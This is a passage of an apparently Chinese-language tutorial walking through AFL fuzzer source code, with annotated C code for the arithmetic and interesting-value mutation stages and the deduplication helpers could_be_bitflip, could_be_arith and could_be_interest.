&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        stage_max--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      *(u16 *)(out_buf + i) = orig; <span class="comment">// 恢复原始16位值</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 阶段统计 */</span></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">  stage_finds[STAGE_ARITH16] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">  stage_cycles[STAGE_ARITH16] += stage_max;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ************************* 第三阶段：32位算术运算 *************************</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 长度检查：至少需要4个字节 */</span></span><br><span class="line">  <span class="keyword">if</span> (len &lt; <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_arith;</span><br><span class="line"></span><br><span class="line">  stage_name = <span class="string">&quot;arith 32/8&quot;</span>; <span class="comment">// 32位算术，8位增量</span></span><br><span class="line">  stage_short = <span class="string">&quot;arith32&quot;</span>;</span><br><span class="line">  stage_cur = <span class="number">0</span>;</span><br><span class="line">  stage_max = <span class="number">4</span> * (len - <span class="number">3</span>) * ARITH_MAX; <span class="comment">// len-3: 防止32位读取越界</span></span><br><span class="line"></span><br><span class="line">  orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 遍历每个可能的32位字位置 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">3</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">    u32 orig = *(u32 *)(out_buf + i); <span class="comment">// 读取32位值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检查效应图：四个字节都无效才跳过 */</span></span><br><span class="line">    <span class="keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="number">1</span>)] &amp;&amp;</span><br><span class="line">        !eff_map[EFF_APOS(i + <span class="number">2</span>)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="number">3</span>)]) &#123;</span><br><span class="line">      stage_max -= <span class="number">4</span> * ARITH_MAX;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= ARITH_MAX; j++) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 预计算四种操作的XOR结果 */</span></span><br><span class="line">      u32 r1 = orig ^ (orig + j), r2 = orig ^ (orig - j),</span><br><span class="line">          r3 = orig ^ SWAP32(SWAP32(orig) + j),</span><br><span class="line">          r4 = orig ^ SWAP32(SWAP32(orig) - j);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 小端处理 */</span></span><br><span class="line">      stage_val_type = STAGE_VAL_LE;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 关键优化：只有当操作会影响超过低16位时才执行</span></span><br><span class="line"><span class="comment">       * (orig &amp; 0xffff) + j &gt; 0xffff 检查是否会进位到高16位</span></span><br><span class="line"><span class="comment">       * 这避免了与16位阶段的重复</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> ((orig &amp; <span class="number">0xffff</span>) + j &gt; <span class="number">0xffff</span> &amp;&amp; !could_be_bitflip(r1)) &#123;</span><br><span class="line">        stage_cur_val = j;</span><br><span class="line">        *(u32 *)(out_buf + i) = orig + j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        stage_cur++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        stage_max--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 小端减法：检查是否会从高16位借位 */</span></span><br><span class="line">      <span class="keyword">if</span> ((orig &amp; <span class="number">0xffff</span>) &lt; j &amp;&amp; !could_be_bitflip(r2)) &#123;</span><br><span class="line">        stage_cur_val = -j;</span><br><span class="line">        *(u32 *)(out_buf + i) = orig - j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        stage_cur++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        stage_max--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 大端处理 */</span></span><br><span class="line">      stage_val_type = STAGE_VAL_BE;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* SWAP32: 交换32位值的字节序（ABCD -&gt; DCBA） */</span></span><br><span class="line">      <span class="keyword">if</span> ((SWAP32(orig) &amp; <span class="number">0xffff</span>) + j &gt; <span class="number">0xffff</span> &amp;&amp; !could_be_bitflip(r3)) &#123;</span><br><span class="line">        stage_cur_val = j;</span><br><span class="line">        *(u32 *)(out_buf + i) = SWAP32(SWAP32(orig) + j);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        stage_cur++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        stage_max--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 大端减法 */</span></span><br><span class="line">      <span class="keyword">if</span> ((SWAP32(orig) &amp; <span class="number">0xffff</span>) &lt; j &amp;&amp; !could_be_bitflip(r4)) &#123;</span><br><span class="line">        stage_cur_val = -j;</span><br><span class="line">        *(u32 *)(out_buf + i) = SWAP32(SWAP32(orig) - j);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">          <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        stage_cur++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        stage_max--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      *(u32 *)(out_buf + i) = orig; <span class="comment">// 恢复原始32位值</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 最终统计 */</span></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line">  stage_finds[STAGE_ARITH32] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">  stage_cycles[STAGE_ARITH32] += stage_max;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先是8位运算阶段，先检查是否对加法和减法进行测试，对一个字节的内容进行操作，从+1到+35，从-1到-35，对该字节进行操作后先检测是否和之前位取反的操作重复，如果重复就跳过，这样可以加快fuzz的速度，提高效率，具体是怎么判断的我们看看could_be_bitflip</p><h4 id="could-be-bitflip"><a href="#could-be-bitflip" class="headerlink" title="could_be_bitflip"></a>could_be_bitflip</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u8 <span class="title">could_be_bitflip</span><span class="params">(u32 xor_val)</span> </span>&#123;</span><br><span class="line">  u32 sh = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果XOR结果为0，说明两个值相同，认为是位翻转（翻转0位） */</span></span><br><span class="line">  <span class="keyword">if</span> (!xor_val)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 将XOR结果右移，直到最低位为1，记录移位次数</span></span><br><span class="line"><span class="comment">   * 这样可以找到第一个被翻转的位的位置 */</span></span><br><span class="line">  <span class="keyword">while</span> (!(xor_val &amp; <span class="number">1</span>)) &#123;</span><br><span class="line">    sh++;</span><br><span class="line">    xor_val &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 检查1位、2位和4位的翻转模式</span></span><br><span class="line"><span class="comment">   * xor_val == 1   -&gt; 0b1      (翻转1位)</span></span><br><span class="line"><span class="comment">   * xor_val == 3   -&gt; 0b11     (翻转连续2位)</span></span><br><span class="line"><span class="comment">   * xor_val == 15  -&gt; 0b1111   (翻转连续4位)</span></span><br><span class="line"><span class="comment">   * 这些模式可以出现在任意位置 */</span></span><br><span class="line">  <span class="keyword">if</span> (xor_val == <span class="number">1</span> || xor_val == <span class="number">3</span> || xor_val == <span class="number">15</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 对于8位、16位和32位的翻转模式，要求起始位置必须是8的倍数</span></span><br><span class="line"><span class="comment">   * 因为AFL在这些宽度上的变异操作是按字节对齐的 */</span></span><br><span class="line">  <span class="keyword">if</span> (sh &amp; <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 检查8位、16位和32位的完全翻转模式</span></span><br><span class="line"><span class="comment">   * xor_val == 0xff         -&gt; 0b11111111                 (翻转8位/1字节)</span></span><br><span class="line"><span class="comment">   * xor_val == 0xffff       -&gt; 0b1111111111111111         (翻转16位/2字节)</span></span><br><span class="line"><span class="comment">   * xor_val == 0xffffffff   -&gt; 0b11111111111111111111111111111111 (翻转32位/4字节) */</span></span><br><span class="line">  <span class="keyword">if</span> (xor_val == <span class="number">0xff</span> || xor_val == <span class="number">0xffff</span> || xor_val == <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 其他模式不被认为是简单的位翻转操作 */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是和之前的各种翻转结果去对比，如果相同就返回1。</p><p>接下来是16位运算阶段，16位和8位有一些区别，16位存在大小端的区别，会对大端和小端分别测试，其他和8位差不多，只不过是只有影响到两个字节的时候才可能调用<strong>common_fuzz_stuff</strong>。</p><p>同样的32位也是4种，有大小端的区别，只有影响超过3个字节才会调用<strong>common_fuzz_stuff</strong>。</p><h3 id="有趣值替换阶段"><a href="#有趣值替换阶段" class="headerlink" title="有趣值替换阶段"></a>有趣值替换阶段</h3><p>还是和之前一样先对8位进行替换，替换的目标是设置好的interesting，是AFL设置好的，可以查看到：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INTERESTING_8 \</span></span><br><span class="line"><span class="meta">  -128,          <span class="comment">/* Overflow signed 8-bit when decremented  */</span> \</span></span><br><span class="line"><span class="meta">  -1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   0,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   16,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   64,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   100,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   127           <span class="comment">/* Overflow signed 8-bit when incremented  */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INTERESTING_16 \</span></span><br><span class="line"><span class="meta">  -32768,        <span class="comment">/* Overflow signed 16-bit when decremented */</span> \</span></span><br><span class="line"><span class="meta">  -129,          <span class="comment">/* Overflow signed 8-bit                   */</span> \</span></span><br><span class="line"><span class="meta">   128,          <span class="comment">/* Overflow signed 8-bit                   */</span> \</span></span><br><span class="line"><span class="meta">   255,          <span class="comment">/* Overflow unsig 8-bit when incremented   */</span> \</span></span><br><span class="line"><span class="meta">   256,          <span class="comment">/* Overflow unsig 8-bit                    */</span> \</span></span><br><span class="line"><span class="meta">   512,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   1000,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   1024,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   4096,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32767         <span class="comment">/* Overflow signed 16-bit when incremented */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INTERESTING_32 \</span></span><br><span class="line"><span class="meta">  -2147483648LL, <span class="comment">/* Overflow signed 32-bit when decremented */</span> \</span></span><br><span class="line"><span class="meta">  -100663046,    <span class="comment">/* Large negative number (endian-agnostic) */</span> \</span></span><br><span class="line"><span class="meta">  -32769,        <span class="comment">/* Overflow signed 16-bit                  */</span> \</span></span><br><span class="line"><span class="meta">   32768,        <span class="comment">/* Overflow signed 16-bit                  */</span> \</span></span><br><span class="line"><span class="meta">   65535,        <span class="comment">/* Overflow unsig 16-bit when incremented  */</span> \</span></span><br><span class="line"><span class="meta">   65536,        <span class="comment">/* Overflow unsig 16 bit                   */</span> \</span></span><br><span class="line"><span class="meta">   100663045,    <span class="comment">/* Large positive number (endian-agnostic) */</span> \</span></span><br><span class="line"><span class="meta">   2147483647    <span class="comment">/* Overflow signed 32-bit when incremented */</span></span></span><br></pre></td></tr></table></figure><p>同样的在替换之前要考虑之前是否有重复这里出现了个新的判别函数，主要是防止与之前的算数运算阶段重复</p><h4 id="could-be-arith"><a href="#could-be-arith" class="headerlink" title="could_be_arith"></a>could_be_arith</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u8 <span class="title">could_be_arith</span><span class="params">(u32 old_val, u32 new_val, u8 blen)</span> </span>&#123;</span><br><span class="line">  u32 i, ov = <span class="number">0</span>, nv = <span class="number">0</span>, diffs = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果两个值相等，直接返回1 */</span></span><br><span class="line">  <span class="keyword">if</span> (old_val == new_val)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 第一步：检查单字节级别的算术修改 ========== */</span></span><br><span class="line">  <span class="comment">/* 遍历每个字节，查看是否仅有一个字节发生了变化 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; blen; i++) &#123;</span><br><span class="line">    <span class="comment">/* 提取第i个字节（从低位到高位） */</span></span><br><span class="line">    u8 a = old_val &gt;&gt; (<span class="number">8</span> * i);  <span class="comment">// 原始值的第i个字节</span></span><br><span class="line">    u8 b = new_val &gt;&gt; (<span class="number">8</span> * i);  <span class="comment">// 新值的第i个字节</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 如果该字节不同，记录差异 */</span></span><br><span class="line">    <span class="keyword">if</span> (a != b) &#123;</span><br><span class="line">      diffs++;  <span class="comment">// 差异计数器加1</span></span><br><span class="line">      ov = a;   <span class="comment">// 保存原始字节值</span></span><br><span class="line">      nv = b;   <span class="comment">// 保存新字节值</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果只有一个字节不同，且差值在ARITH_MAX范围内，则认为是算术运算 */</span></span><br><span class="line">  <span class="keyword">if</span> (diffs == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">/* 检查 ov-nv 或 nv-ov 是否 &lt;= ARITH_MAX（考虑加法和减法两种情况） */</span></span><br><span class="line">    <span class="comment">/* 使用(u8)强制转换处理无符号溢出，得到绝对差值 */</span></span><br><span class="line">    <span class="keyword">if</span> ((u8)(ov - nv) &lt;= ARITH_MAX || (u8)(nv - ov) &lt;= ARITH_MAX)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果只有1个字节，无需继续检查更大单位 */</span></span><br><span class="line">  <span class="keyword">if</span> (blen == <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 第二步：检查双字节（16位）级别的算术修改 ========== */</span></span><br><span class="line">  diffs = <span class="number">0</span>;  <span class="comment">// 重置差异计数器</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 遍历每个16位字（word） */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; blen / <span class="number">2</span>; i++) &#123;</span><br><span class="line">    <span class="comment">/* 提取第i个16位字 */</span></span><br><span class="line">    u16 a = old_val &gt;&gt; (<span class="number">16</span> * i);  <span class="comment">// 原始值的第i个字</span></span><br><span class="line">    u16 b = new_val &gt;&gt; (<span class="number">16</span> * i);  <span class="comment">// 新值的第i个字</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 如果该字不同，记录差异 */</span></span><br><span class="line">    <span class="keyword">if</span> (a != b) &#123;</span><br><span class="line">      diffs++;</span><br><span class="line">      ov = a;</span><br><span class="line">      nv = b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果只有一个16位字不同 */</span></span><br><span class="line">  <span class="keyword">if</span> (diffs == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">/* 先检查原始字节序的差值 */</span></span><br><span class="line">    <span class="keyword">if</span> ((u16)(ov - nv) &lt;= ARITH_MAX || (u16)(nv - ov) &lt;= ARITH_MAX)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 再检查交换字节序后的差值（处理大小端问题） */</span></span><br><span class="line">    <span class="comment">/* 例如：0x1234 &lt;-&gt; 0x3412 */</span></span><br><span class="line">    ov = SWAP16(ov);</span><br><span class="line">    nv = SWAP16(nv);</span><br><span class="line">    <span class="keyword">if</span> ((u16)(ov - nv) &lt;= ARITH_MAX || (u16)(nv - ov) &lt;= ARITH_MAX)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 第三步：检查四字节（32位）级别的算术修改 ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (blen == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="comment">/* 检查整个32位值的差值（原始字节序） */</span></span><br><span class="line">    <span class="keyword">if</span> ((u32)(old_val - new_val) &lt;= ARITH_MAX ||</span><br><span class="line">        (u32)(new_val - old_val) &lt;= ARITH_MAX)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 检查交换字节序后的整个32位值的差值 */</span></span><br><span class="line">    <span class="comment">/* 例如：0x12345678 &lt;-&gt; 0x78563412 */</span></span><br><span class="line">    new_val = SWAP32(new_val);</span><br><span class="line">    old_val = SWAP32(old_val);</span><br><span class="line">    <span class="keyword">if</span> ((u32)(old_val - new_val) &lt;= ARITH_MAX ||</span><br><span class="line">        (u32)(new_val - old_val) &lt;= ARITH_MAX)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果以上所有检查都不满足，返回0表示不是简单的算术修改 */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后后面16位32位同样的操作，只不过有大小端以及一个新的检测，防止和之前的8位有重复，32位还要防止16位重复，这个判别函数是could_be_interest</p><h4 id="could-be-interest"><a href="#could-be-interest" class="headerlink" title="could_be_interest"></a>could_be_interest</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u8 <span class="title">could_be_interest</span><span class="params">(u32 old_val, u32 new_val, u8 blen, u8 check_le)</span> </span>&#123;</span><br><span class="line">  u32 i, j;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果两个值相等，直接返回1 */</span></span><br><span class="line">  <span class="keyword">if</span> (old_val == new_val)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 第一步：检查单字节有趣值替换 ========== */</span></span><br><span class="line">  <span class="comment">/* 尝试用interesting_8数组中的每个值替换old_val的每个字节 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; blen; i++) &#123;  <span class="comment">// 遍历每个字节位置</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="keyword">sizeof</span>(interesting_8); j++) &#123;  <span class="comment">// 遍历所有有趣的8位值</span></span><br><span class="line">      <span class="comment">/* 构造测试值：</span></span><br><span class="line"><span class="comment">       * 1. 使用 ~(0xff &lt;&lt; (i * 8)) 创建掩码，清除第i个字节</span></span><br><span class="line"><span class="comment">       * 2. 将interesting_8[j]插入到第i个字节位置</span></span><br><span class="line"><span class="comment">       * 例如：old_val=0x12345678, i=1, interesting_8[j]=0xAA</span></span><br><span class="line"><span class="comment">       *       掩码: ~(0xff &lt;&lt; 8) = 0xFFFF00FF</span></span><br><span class="line"><span class="comment">       *       结果: 0x1234AA78</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      u32 tval =</span><br><span class="line">          (old_val &amp; ~(<span class="number">0xff</span> &lt;&lt; (i * <span class="number">8</span>))) |  <span class="comment">// 清除第i个字节</span></span><br><span class="line">          (((u8)interesting_8[j]) &lt;&lt; (i * <span class="number">8</span>));  <span class="comment">// 插入有趣值</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 如果构造的值等于new_val，说明是通过有趣值替换产生的 */</span></span><br><span class="line">      <span class="keyword">if</span> (new_val == tval)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果blen==2且不检查小端序，提前返回</span></span><br><span class="line"><span class="comment">   * 这是为大端序检查做准备，避免重复检查 */</span></span><br><span class="line">  <span class="keyword">if</span> (blen == <span class="number">2</span> &amp;&amp; !check_le)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 第二步：检查双字节有趣值替换 ========== */</span></span><br><span class="line">  <span class="comment">/* 尝试用interesting_16数组中的每个值替换old_val的每个16位字 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; blen - <span class="number">1</span>; i++) &#123;  <span class="comment">// 遍历每个可能的16位边界位置</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="keyword">sizeof</span>(interesting_16) / <span class="number">2</span>; j++) &#123;  <span class="comment">// 遍历所有有趣的16位值</span></span><br><span class="line">      <span class="comment">/* 构造测试值（小端序）：</span></span><br><span class="line"><span class="comment">       * 清除从第i个字节开始的2个字节，然后插入16位有趣值</span></span><br><span class="line"><span class="comment">       * 例如：old_val=0x12345678, i=1, interesting_16[j]=0xAABB</span></span><br><span class="line"><span class="comment">       *       掩码: ~(0xffff &lt;&lt; 8) = 0xFF0000FF</span></span><br><span class="line"><span class="comment">       *       结果: 0x12AABB78</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      u32 tval = (old_val &amp; ~(<span class="number">0xffff</span> &lt;&lt; (i * <span class="number">8</span>))) |</span><br><span class="line">                 (((u16)interesting_16[j]) &lt;&lt; (i * <span class="number">8</span>));</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (new_val == tval)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 只在blen &gt; 2时继续检查字节序交换的情况 */</span></span><br><span class="line">      <span class="comment">/* 对于2字节值，字节序交换会在后续的大端序检查中处理 */</span></span><br><span class="line">      <span class="keyword">if</span> (blen &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="comment">/* 构造测试值（大端序）：</span></span><br><span class="line"><span class="comment">         * 对interesting_16[j]进行字节序交换后再插入</span></span><br><span class="line"><span class="comment">         * 例如：0xAABB -&gt; SWAP16 -&gt; 0xBBAA</span></span><br><span class="line"><span class="comment">         * 这样可以处理大端序存储的情况</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        tval = (old_val &amp; ~(<span class="number">0xffff</span> &lt;&lt; (i * <span class="number">8</span>))) |</span><br><span class="line">               (SWAP16(interesting_16[j]) &lt;&lt; (i * <span class="number">8</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (new_val == tval)</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 第三步：检查四字节有趣值替换（仅小端序） ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (blen == <span class="number">4</span> &amp;&amp; check_le) &#123;</span><br><span class="line">    <span class="comment">/* 尝试用interesting_32数组中的每个值直接替换整个32位值</span></span><br><span class="line"><span class="comment">     * 注意：这里只检查小端序，大端序会在另一次调用中处理</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="keyword">sizeof</span>(interesting_32) / <span class="number">4</span>; j++)</span><br><span class="line">      <span class="keyword">if</span> (new_val == (u32)interesting_32[j])</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果以上所有检查都不匹配，返回0 */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就不做多余赘述了，我直接附上代码注释</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">skip_arith:</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*============================================</span></span><br><span class="line"><span class="comment">   * STAGE 1: 8位有趣值替换 (interest 8/8)</span></span><br><span class="line"><span class="comment">   * 遍历每个字节，尝试替换为预定义的8位有趣值</span></span><br><span class="line"><span class="comment">   *============================================*/</span></span><br><span class="line">  </span><br><span class="line">  stage_name = <span class="string">&quot;interest 8/8&quot;</span>;</span><br><span class="line">  stage_short = <span class="string">&quot;int8&quot;</span>;</span><br><span class="line">  stage_cur = <span class="number">0</span>;</span><br><span class="line">  stage_max = len * <span class="keyword">sizeof</span>(interesting_8);  <span class="comment">// 最大测试数 = 文件长度 × 有趣值数量</span></span><br><span class="line"></span><br><span class="line">  stage_val_type = STAGE_VAL_LE;  <span class="comment">// 8位值无字节序问题</span></span><br><span class="line"></span><br><span class="line">  orig_hit_cnt = new_hit_cnt;  <span class="comment">// 记录本阶段开始时的发现数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 遍历输入文件的每个字节 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"></span><br><span class="line">    u8 orig = out_buf[i];  <span class="comment">// 保存原始字节值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* === 效应图优化 ===</span></span><br><span class="line"><span class="comment">     * 如果该字节在 bitflip 1/1 阶段被标记为&quot;无效&quot;</span></span><br><span class="line"><span class="comment">     * （即单bit翻转从未触发新路径），则跳过</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!eff_map[EFF_APOS(i)]) &#123;</span><br><span class="line">      stage_max -= <span class="keyword">sizeof</span>(interesting_8);  <span class="comment">// 减少计数器</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = i;  <span class="comment">// 记录当前处理的字节位置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 遍历所有8位有趣值 */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="keyword">sizeof</span>(interesting_8); j++) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* === 去重优化 ===</span></span><br><span class="line"><span class="comment">       * 跳过以下情况：</span></span><br><span class="line"><span class="comment">       * 1. could_be_bitflip: 该值可能由 bitflip 阶段产生</span></span><br><span class="line"><span class="comment">       *    例如：orig=0x00, interesting=0xFF (翻转8位)</span></span><br><span class="line"><span class="comment">       * 2. could_be_arith: 该值可能由 arith 阶段产生</span></span><br><span class="line"><span class="comment">       *    例如：orig=0x05, interesting=0x06 (加1)</span></span><br><span class="line"><span class="comment">       * </span></span><br><span class="line"><span class="comment">       * 原因：避免重复测试已经在之前阶段执行过的变异</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (could_be_bitflip(orig ^ (u8)interesting_8[j]) ||</span><br><span class="line">          could_be_arith(orig, (u8)interesting_8[j], <span class="number">1</span>)) &#123;</span><br><span class="line">        stage_max--;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 